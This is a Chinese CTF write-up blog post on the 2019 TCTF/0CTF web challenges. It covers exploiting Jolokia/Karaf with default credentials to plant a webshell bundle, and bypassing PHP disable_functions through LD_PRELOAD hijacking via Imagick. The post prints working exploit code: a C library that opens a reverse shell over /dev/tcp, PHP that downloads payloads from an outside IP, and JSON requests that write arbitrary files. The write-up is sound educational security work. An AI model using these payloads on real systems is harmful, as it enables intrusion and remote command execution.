<!doctype html><html lang=en-us>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="上周末抽空佛系打了一下 TCTF/0CTF ，跟马师傅一起做了 web1 ，web 2 没来得及看就关闭了。这里就记录一下。
"><title>TCTF/0CTF-Web 记录</title>
<link rel=canonical href=https://blog.zeddyu.info/2019/04/03/TCTF-0CTF-Web-%E8%AE%B0%E5%BD%95/>
<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="TCTF/0CTF-Web 记录">
<meta property="og:description" content="上周末抽空佛系打了一下 TCTF/0CTF ，跟马师傅一起做了 web1 ，web 2 没来得及看就关闭了。这里就记录一下。
">
<meta property="og:url" content="https://blog.zeddyu.info/2019/04/03/TCTF-0CTF-Web-%E8%AE%B0%E5%BD%95/">
<meta property="og:site_name" content="Zeddy's Blog">
<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:tag" content="wp"><meta property="article:tag" content="karaf"><meta property="article:tag" content="Imagick"><meta property="article:published_time" content="2019-04-03T00:09:58+00:00"><meta property="article:modified_time" content="2019-04-03T00:09:58+00:00">
<meta name=twitter:site content="@ZeddYu_Lu">
<meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="TCTF/0CTF-Web 记录">
<meta name=twitter:description content="上周末抽空佛系打了一下 TCTF/0CTF ，跟马师傅一起做了 web1 ，web 2 没来得及看就关闭了。这里就记录一下。
">
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-112937997-1','auto'),ga('send','pageview'))</script>
</head>
<body class="article-page has-toc">
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex
extended">
<div id=article-toolbar>
<a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
<span>Back</span>
</a>
</div>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>
CTF
</a>
</header>
<h2 class=article-title>
<a href=/2019/04/03/TCTF-0CTF-Web-%E8%AE%B0%E5%BD%95/>TCTF/0CTF-Web 记录</a>
</h2>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Apr 03, 2019</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
6 minute read
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<p>上周末抽空佛系打了一下 TCTF/0CTF ，跟马师傅一起做了 web1 ，web 2 没来得及看就关闭了。这里就记录一下。</p>
<h1 id=web1-ghost-pepper>Web1 Ghost Pepper</h1>
<h2 id=description>Description</h2>
<blockquote>
<p>​ Do you know ghost pepper? Let&rsquo;s eat. http://111.186.63.207:31337</p>
</blockquote>
<h2 id=hacking>Hacking</h2>
<p>由于环境关掉了，这里就不放图了。说一下几个解法。</p>
<p>首先通过弱口令 karaf/karaf 进行认证，进入发现是 jetty 的中间件，然后思路一直走偏在这个中间件上，直到有师傅跟我说 ghost pepper 指的是 Jolokia…nb&mldr;</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009331.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009331.jpg loading=lazy>
</a>
</figure></p>
<p>然后又参考了几篇腾讯云鼎的相关文章：</p>
<p><a class=link href=https://www.anquanke.com/post/id/103016 target=_blank rel=noopener>Exploiting Jolokia Agent with Java EE Servers</a></p>
<p>尝试了 JNDI 注入，发现 proxymode 没开，所以得另想法子，在<code>/jolokia/list</code> 我们发现了一些库，最终目标聚集到了 karaf 上。</p>
<p>第一种解法是通过激活 webconsole 这个 karaf 的 feature ，进入 webconsole ，这是一个类似 Tomcat Manager 后台的一个东西，进入之后可以上传 bundle ，并且勾选自动 refresh bundle ，就相当于上传了一个 webshell 一样，直接连就好了，关于 bunlde 的构建留到下面讲吧。还有就是进去 Main/gogo 的选项，就可以拿到 karaf 内置的一个 shell ，具体命令可以参考 <a class=link href=http://karaf.apache.org/manual/latest/#_shell_console_basics target=_blank rel=noopener>Shell console basics</a>，通过<code>shell:cat /flag</code></p>
<p>激活 webconsole 的 payload 如下</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=nf>POST</span> <span class=nn>/jolokia</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
<span class=n>Host</span><span class=o>:</span> <span class=l>111.186.63.207:31337</span>
<span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span>
<span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span>
<span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
<span class=n>Content-Length</span><span class=o>:</span> <span class=l>146</span>
<span class=n>Authorization</span><span class=o>:</span> <span class=l>Basic a2FyYWY6a2FyYWY=</span>
<span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
<span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>

<span class=p>{</span>  
	<span class=nt>&#34;type&#34;</span><span class=p>:</span><span class=s2>&#34;EXEC&#34;</span><span class=p>,</span>
  <span class=nt>&#34;mbean&#34;</span><span class=p>:</span><span class=s2>&#34;org.apache.karaf:name=root,type=feature&#34;</span><span class=p>,</span>
  <span class=nt>&#34;operation&#34;</span><span class=p>:</span> <span class=s2>&#34;installFeature(java.lang.String)&#34;</span><span class=p>,</span>
  <span class=nt>&#34;arguments&#34;</span><span class=p>:[</span><span class=s2>&#34;webconsole&#34;</span><span class=p>]</span>
<span class=p>}</span>
</code></pre></div><p>还有其他的就是通过好几个<code>/list</code>中的<code>install</code>方法来实现。比如<code>karaf.config</code>或者<code>karaf.bundle</code>的方法都可以，具体方法的实现直接去下一个 karaf 源码来看看就知道了。</p>
<pre tabindex=0><code>{
  &quot;type&quot;:&quot;EXEC&quot;
  &quot;mbean&quot;:&quot;org.apache.karaf:name=root,type=config&quot;,
  &quot;operation&quot;:&quot;install&quot;,
  &quot;arguments&quot;:[&quot;http://ip:port/webshell.jar&quot;,&quot;../../../../../opt/opendaylight-0.9.2/deploy/webshell.jar&quot;,false]
}
</code></pre><p>这里<code>karaf.config</code>是个 0day…可以写任意文件</p>
<p>这里利用的难点就是如何构造一个 bundle 文件了&mldr;从来都不知道还有这种文件…而且是个<code>.jar</code>文件，而且这个东西的触发点在<code>start</code>函数，非<code>main</code>函数&mldr;可以按照马师傅的这个仓库来构建：<a class=link href=https://github.com/imagemlt/osgi-bundle-backdoor target=_blank rel=noopener>osgi-bundle-backdoor</a></p>
<h1 id=web2-wallbreaker-easy>Web2 Wallbreaker Easy</h1>
<h2 id=description-1>Description</h2>
<blockquote>
<p>​ http://111.186.63.208:31340</p>
</blockquote>
<p>打开地址可以发现有更多的描述</p>
<blockquote>
<p>​ Imagick is a awesome library for hackers to break <code>disable_functions</code>.</p>
<p>So I installed php-imagick in the server, opened a <code>backdoor</code> for you.
Let&rsquo;s try to execute <code>/readflag</code> to get the flag.
Open basedir: /var/www/html:/tmp/7833d7f27adcba46bdfd6c9c31c89904
Hint: eval($_POST[&ldquo;backdoor&rdquo;]);</p>
</blockquote>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008570.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008570.jpg loading=lazy>
</a>
</figure></p>
<h2 id=the-first-way-to-hack>The first way to Hack</h2>
<p>一看题目意图也比较明显，需要我们利用<code>Imagick</code>这个模块去进行 rce</p>
<p>我们先直接看看<code>phpinfo()</code>，发现果然是能执行命令的基本都被 disable 掉了</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002789.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002789.jpg loading=lazy>
</a>
</figure></p>
<p>我们还可以调用<code>readfile()</code>来查看题目源代码</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=nv>$dir</span> <span class=o>=</span> <span class=s2>&#34;/tmp/&#34;</span> <span class=o>.</span> <span class=nx>md5</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$_SERVER[REMOTE_ADDR]</span><span class=s2>&#34;</span><span class=p>);</span>
<span class=nx>mkdir</span><span class=p>(</span><span class=nv>$dir</span><span class=p>);</span>
<span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;open_basedir&#39;</span><span class=p>,</span> <span class=s1>&#39;/var/www/html:&#39;</span> <span class=o>.</span> <span class=nv>$dir</span><span class=p>);</span>
<span class=cp>?&gt;</span><span class=err>
</span><span class=err>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;style&gt;.pre {word-break: break-all;max-width: 500px;white-space: pre-wrap;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;
</span><span class=err>&lt;pre class=&#34;pre&#34;&gt;&lt;code&gt;Imagick is a awesome library for hackers to break `disable_functions`.
</span><span class=err>So I installed php-imagick in the server, opened a `backdoor` for you.
</span><span class=err>Let&#39;s try to execute `/readflag` to get the flag.
</span><span class=err>Open basedir: &lt;?php echo ini_get(&#39;open_basedir&#39;);?&gt;
</span><span class=err>
</span><span class=err>&lt;?php eval($_POST[&#34;backdoor&#34;]);?&gt;
</span><span class=err>Hint: eval($_POST[&#34;backdoor&#34;]);
</span><span class=err>&lt;/code&gt;&lt;/pre&gt;&lt;/body&gt;
</span><span class=err>Hint: eval($_POST[&#34;backdoor&#34;]);
</span><span class=err>&lt;/code&gt;&lt;/pre&gt;&lt;/body&gt;
</span></code></pre></div><p>首先我们来了解一下题目涉及的几个函数</p>
<h3 id=open_basedir>open_basedir</h3>
<p>{% colorquote info %}</p>
<p>open_basedir 将 php 所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如<code>fopen()</code>或<code>file_get_contents()</code>打开一个文件时，这个文件的位置将会被检查。当文件在指定的目录树之外，程序将拒绝打开。</p>
<p>{% endcolorquote %}</p>
<p>例如就像这样，设置了<code>ini_set('open_basedir','/var/www/html');</code>之后，我们只能在<code>/var/www/html</code>进行操作，即<code>open_basedir</code>是用来限制访问目录的</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006126.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006126.jpg loading=lazy>
</a>
</figure></p>
<h3 id=bypass-open_basedir>Bypass Open_Basedir</h3>
<p>详细可参考<a class=link href=https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/ target=_blank rel=noopener>How to bypass disable_functions and open_basedir</a>，文章中就提到可以使用<code>LD_PRELOAD</code>和<code>putenv()</code>函数进行绕过</p>
<h3 id=ld_preload>LD_PRELOAD</h3>
<p>我们首先来看看什么是<code>LD_PRELOAD</code></p>
<p>{% colorquote info %}</p>
<p>LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will <strong>load</strong> <strong>before</strong> <strong>any</strong> other <strong>shared</strong> <strong>library</strong> <strong>including</strong> the C runtime <strong>library</strong> (libc.so) This <strong>is</strong> called preloading a library.</p>
<p>{% endcolorquote %}</p>
<p>简单来说，<code>LD_PRELOAD</code>这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用。</p>
<p>{% colorquote info %}</p>
<p>putenv ( string <code>$setting</code> ) : bool</p>
<p>添加 <code>setting</code> 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p>
<p>{% endcolorquote %}</p>
<p>而<code>putenv()</code>可以设置环境换变量，添加我们定义的变量到服务器环境变量。</p>
<p>那么我们大概可以有一个思路，制作一个恶意的<code>.so</code>文件，使用<code>putenv()</code>设置<code>LD_PRELOAD</code>为恶意文件路径，然后使用某个php函数，触发这个<code>.so</code>文件，执行我们的恶意代码。</p>
<p>具体的攻击链可以参考：<a class=link href=https://www.cnblogs.com/net66/p/5609026.html target=_blank rel=noopener>LD_PRELOAD的偷梁换柱之能</a></p>
<h3 id=劫持攻击>劫持攻击</h3>
<p>参考的绕过文章使用了<code>mail()</code>函数，我们可以看看</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004191.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004191.jpg loading=lazy>
</a>
</figure></p>
<p>这里确实开启了子进程，那我们再试试引入<code>putenv()</code>的效果，配合动态链接库尝试劫持，代码来自<a class=link href=https://github.com/TarlogicSecurity/Chankro target=_blank rel=noopener>Chankro</a></p>
<p>其中<code>__attribute__ ((__constructor__))</code>有如下说明</p>
<pre tabindex=0><code>1.It's run when a shared library is loaded, typically during program startup.
2.That's how all GCC attributes are; presumably to distinguish them from function calls.
3.The destructor is run when the shared library is unloaded, typically at program exit.
</code></pre><p>所以当我们使用上我们的动态链接库后，就会触发<code>__attribute__ ((__constructor__))</code>，从而达成我们rce的目的。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#define  _GNU_SOURCE
</span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp></span>

<span class=kt>void</span> <span class=nf>pwn</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
	<span class=n>system</span><span class=p>(</span><span class=s>&#34;ls&#34;</span><span class=p>);</span>
	<span class=n>system</span><span class=p>(</span><span class=s>&#34;echo hacked&#34;</span><span class=p>);</span>
<span class=p>}</span>

<span class=kt>void</span> <span class=nf>daemonize</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
	<span class=n>signal</span><span class=p>(</span><span class=n>SIGHUP</span><span class=p>,</span> <span class=n>SIG_IGN</span><span class=p>);</span>
	<span class=k>if</span> <span class=p>(</span><span class=n>fork</span><span class=p>()</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
		<span class=n>exit</span><span class=p>(</span><span class=n>EXIT_SUCCESS</span><span class=p>);</span>
	<span class=p>}</span>
<span class=p>}</span>

<span class=n>__attribute__</span> <span class=p>((</span><span class=n>__constructor__</span><span class=p>))</span> <span class=kt>void</span> <span class=n>preloadme</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
  <span class=n>unsetenv</span><span class=p>(</span><span class=s>&#34;LD_PRELOAD&#34;</span><span class=p>);</span>
  <span class=n>daemonize</span><span class=p>();</span>
  <span class=n>pwn</span><span class=p>();</span>
<span class=p>}</span>
</code></pre></div><p>使用以下命令产生动态链接库</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>gcc hack.c -fPIC -shared -o hack.so 
</code></pre></div><p>php 文件中代码为</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
<span class=nx>putenv</span><span class=p>(</span><span class=s2>&#34;LD_PRELOAD=./hack.so&#34;</span><span class=p>);</span>
<span class=nx>mail</span><span class=p>(</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>);</span>
<span class=cp>?&gt;</span><span class=err>
</span></code></pre></div><p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004080.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004080.jpg loading=lazy>
</a>
</figure></p>
<p>可以看到已经执行了<code>ls</code>命令并成功输出了<code>hacked</code>，使用<code>strace</code>看看我们可以发现执行顺序。</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008064.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008064.jpg loading=lazy>
</a>
</figure></p>
<p>当然还有另一种劫持，直接选择一个函数进行劫持，例如我们通过<code>strace php test.php</code>发现调用了<code>geteuid()</code>以及<code>getpid()</code>函数，我们可以在<code>hack.c</code>中这么写</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#define  _GNU_SOURCE
</span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
</span><span class=cp></span>

<span class=kt>void</span> <span class=nf>pwn</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
	<span class=n>system</span><span class=p>(</span><span class=s>&#34;ls&#34;</span><span class=p>);</span>
	<span class=n>system</span><span class=p>(</span><span class=s>&#34;echo hacked!&#34;</span><span class=p>);</span>
<span class=p>}</span>

<span class=kt>void</span> <span class=nf>getpid</span><span class=p>(){</span>
  <span class=n>unsetenv</span><span class=p>(</span><span class=s>&#34;LD_PRELOAD&#34;</span><span class=p>);</span>
  <span class=n>pwn</span><span class=p>();</span>
<span class=p>}</span>

</code></pre></div><p>这样也可以完成劫持</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002758.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002758.jpg loading=lazy>
</a>
</figure></p>
<h3 id=getflag>GetFlag</h3>
<p>所以我们需要找到一个可以启动子进程的函数，以实现我们劫持函数做到 RCE 的目的，然后这里我本地调通了但是远程不知道怎么没打通&mldr;</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009740.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009740.jpg loading=lazy>
</a>
</figure></p>
<p>这里我直接用<code>new</code>了一个<code>.jpg</code>也可以调用子进程，但是服务器却没有触发&mldr;</p>
<p>然后最好还是按照飘零师傅的<a class=link href=https://www.anquanke.com/post/id/175403#h2-6 target=_blank rel=noopener>深入浅出LD_PRELOAD & putenv()</a>用<code>wmv</code>进行了 hook ，最后成功 RCE。</p>
<p>这里的原理就是因为<code>Imagick</code>在处理<code>wmv</code>格式的文件会起一个子进程来处理，所以就达到了我们的目的。还有很多格式的文件都可以，可以参考 ctftime 上该题的其他 wp。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cp>#define  _GNU_SOURCE
</span><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;signal.h&gt;</span><span class=cp>
</span><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span><span class=cp></span>

<span class=kt>void</span> <span class=nf>pwn</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
	<span class=n>system</span><span class=p>(</span><span class=s>&#34;bash -c </span><span class=se>\&#34;</span><span class=s>sh &gt;&amp; /dev/tcp/your_ip/port 0&gt;&amp;1</span><span class=se>\&#34;</span><span class=s> &#34;</span><span class=p>);</span>
<span class=p>}</span>

<span class=kt>void</span> <span class=nf>daemonize</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
	<span class=n>signal</span><span class=p>(</span><span class=n>SIGHUP</span><span class=p>,</span> <span class=n>SIG_IGN</span><span class=p>);</span>
	<span class=k>if</span> <span class=p>(</span><span class=n>fork</span><span class=p>()</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
		<span class=n>exit</span><span class=p>(</span><span class=n>EXIT_SUCCESS</span><span class=p>);</span>
	<span class=p>}</span>
<span class=p>}</span>

<span class=n>__attribute__</span> <span class=p>((</span><span class=n>__constructor__</span><span class=p>))</span> <span class=kt>void</span> <span class=n>preloadme</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
  <span class=n>unsetenv</span><span class=p>(</span><span class=s>&#34;LD_PRELOAD&#34;</span><span class=p>);</span>
  <span class=n>daemonize</span><span class=p>();</span>
  <span class=n>pwn</span><span class=p>();</span>
<span class=p>}</span>
</code></pre></div><p>至于怎么传文件到服务器上，有很多种方法，比如<code>file_put_contents()</code>，也可以用如下的方式</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=nx>copy</span><span class=p>(</span><span class=s2>&#34;http://106.14.153.173:8080/hack.wmv&#34;</span><span class=p>,</span> <span class=s2>&#34;/tmp/3b1412753f475cc969c37231dd6eaea2/hack.wmv&#34;</span><span class=p>);</span>
<span class=nx>copy</span><span class=p>(</span><span class=s2>&#34;http://106.14.153.173:8080/hack.so&#34;</span><span class=p>,</span> <span class=s2>&#34;/tmp/3b1412753f475cc969c37231dd6eaea2/hack.so&#34;</span><span class=p>);</span>
</code></pre></div><h3 id=the-other-way>The other way</h3>
<p>也可以利用<a class=link href=https://www.php.net/manual/zh/function.error-log.php target=_blank rel=noopener>error_log</a>这个方法，这个方法也开启了子进程调用了<code>sendmail</code>方法。按照之前的思路进行就可以了</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007064.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007064.jpg loading=lazy>
</a>
</figure></p>
<h3 id=参考>参考</h3>
<p><a class=link href=https://www.freebuf.com/articles/web/192052.html target=_blank rel=noopener>无需sendmail：巧用LD_PRELOAD突破disable_functions</a></p>
<h2 id=the-second-way-to-hack>The second way to Hack</h2>
<p>这里也主要是用了</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=nt>&lt;delegate</span> <span class=na>decode=</span><span class=s>&#34;bpg&#34;</span> <span class=na>command=</span><span class=s>&#34;&amp;quot;@BPGDecodeDelegate@&amp;quot; -b 16 -o &amp;quot;%o.png&amp;quot; &amp;quot;%i&amp;quot;; @MVDelegate@ &amp;quot;%o.png&amp;quot; &amp;quot;%o&amp;quot;&#34;</span><span class=nt>/&gt;</span>

//&#34;@BPGDecodeDelegate@&#34; -b 16 -o &#34;%o.png&#34; &#34;%i&#34;; @MVDelegate@ &#34;%o.png&#34; &#34;%o&#34;
</code></pre></div><p>这里参考了其他师傅的 wp ，主要是利用了<code>@BPGDecodeDelegate</code>对于后缀<code>.bpg</code>的解析，它会去 PATH 中寻找相关的<code>bpgenc</code>文件</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009100.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009100.jpg loading=lazy>
</a>
</figure></p>
<p>所以我们只需要设置一个恶意的 PATH ，并在这个文件夹下放入我们的可执行文件。</p>
<p>只要找到函数要执行的文件我们就可以进行操作了。例如下面用了<code>Imagick->readImage()</code>的方法</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002391.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002391.jpg loading=lazy>
</a>
</figure></p>
<h1 id=conclusion>Conclusion</h1>
<p>这次比赛还是玩的比较有收获的，至少给我打发了周末等面试结果的煎熬时光2333…第一题自己想法是通过 karaf.shell 去做，然而并没有找到突破点，还是跟另一个师傅弄了 karaf.config 的 install 方法去做的。菜还是菜，并没有去发掘文档深入的点。第二题在比赛中因为没什么时间了，就没怎么去看了。赛后复现觉得自己对 php 底层了解的很少，打算这段时间可以去往这方面发掘一下。也还有关于第二题解法二的发掘点还存在一定的疑惑，可能就是从 fuzz bpg 格式开始寻找到的突破点吧。还看到了另一个关于题二的解法，等会还可以研究下一下。</p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/tags/CTF/>CTF</a>
<a href=/tags/wp/>wp</a>
<a href=/tags/karaf/>karaf</a>
<a href=/tags/Imagick/>Imagick</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
<div class="notice notice-tip">
<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div>
<p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br>
<p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br>
</div>
</footer>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>Related contents</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/2020/04/24/Plaid-CTF-2020-Web-2/>
<div class=article-details>
<h2 class=article-title>Plaid CTF 2020 Catalog</h2>
</div>
</a>
</article>
<article>
<a href=/2020/04/20/Plaid-CTF-2020-Web-1/>
<div class=article-details>
